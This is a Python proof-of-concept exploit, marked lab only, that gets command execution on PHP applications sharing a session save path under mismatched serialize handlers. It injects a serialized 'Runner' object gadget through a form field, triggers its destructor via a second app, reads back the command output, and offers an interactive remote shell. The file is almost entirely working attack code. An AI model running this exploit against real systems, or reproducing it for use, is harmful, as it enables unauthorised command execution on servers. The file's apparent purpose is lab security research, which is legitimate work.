#!/usr/bin/env python3
"""
Command execution through the session handler MISMATCH - lab only.

NOT CVE-2026-109618/109619. This works because two applications share
session.save_path with different session.serialize_handler values
(php_serialize writer, php reader) and the reader defines a class whose
__destruct runs a command. It works on any PHP version, patched or not.

    python3 poc/mismatch.py --target http://127.0.0.1:18092 -c id
    python3 poc/mismatch.py --target http://127.0.0.1:18092          # interactive

How the injection works:
    session file : a:1:{s:4:"note";s:22:"x|O:6:"Runner":1:{...}";}
    php handler  : splits at the first "|" -> unserialize(...) -> object
                   -> decode then fails on the trailing "\";}" (after the
                   object exists), so __destruct still runs.
"""
import argparse
import http.client
import sys
import time
from urllib.parse import urlencode

GADGET = 'O:6:"Runner":1:{s:3:"cmd";s:%d:"%s";}'


def payload(cmd):
    return "x|" + (GADGET % (len(cmd.encode()), cmd))


def request(host, port, path, body=None, sid=None, timeout=15):
    conn = http.client.HTTPConnection(host, port, timeout=timeout)
    headers = {"Cookie": "PHPSESSID=" + sid} if sid else {}
    if body is not None:
        headers.update({"Content-Type": "application/x-www-form-urlencoded",
                        "Content-Length": str(len(body))})
    try:
        conn.request("POST" if body is not None else "GET", path, body=body, headers=headers)
        resp = conn.getresponse()
        return resp.status, resp.getheaders(), resp.read()
    finally:
        conn.close()


def sid_from(headers):
    for k, v in headers:
        if k.lower() == "set-cookie" and v.upper().startswith("PHPSESSID="):
            return v.split("=", 1)[1].split(";")[0]
    return None


def run(host, port, cmd):
    _, headers, _ = request(host, port, "/app/index.php")
    sid = sid_from(headers) or "a" * 32
    request(host, port, "/app/index.php", body=urlencode({"note": payload(cmd)}), sid=sid)
    request(host, port, "/api/index.php", sid=sid)
    time.sleep(0.15)                      # destructor runs at shutdown
    _, _, out = request(host, port, "/api/out.txt")
    return out.decode("utf-8", "replace").rstrip("\n")


def main():
    ap = argparse.ArgumentParser(description=__doc__,
                                 formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--target", default="http://127.0.0.1:18092")
    ap.add_argument("-c", "--cmd", help="run one command and exit")
    args = ap.parse_args()

    host, _, port = args.target.replace("http://", "").partition(":")
    port = int(port or 80)

    if args.cmd:
        print(run(host, port, args.cmd))
        return 0

    print("handler-mismatch lab shell (not the CVE); 'exit' to quit")
    while True:
        try:
            cmd = input("cmd> ").strip()
        except (EOFError, KeyboardInterrupt):
            print()
            return 0
        if not cmd:
            continue
        if cmd in ("exit", "quit"):
            return 0
        try:
            print(run(host, port, cmd))
        except Exception as exc:          # noqa: BLE001 - shown to the operator
            print("error:", exc)


if __name__ == "__main__":
    sys.exit(main())
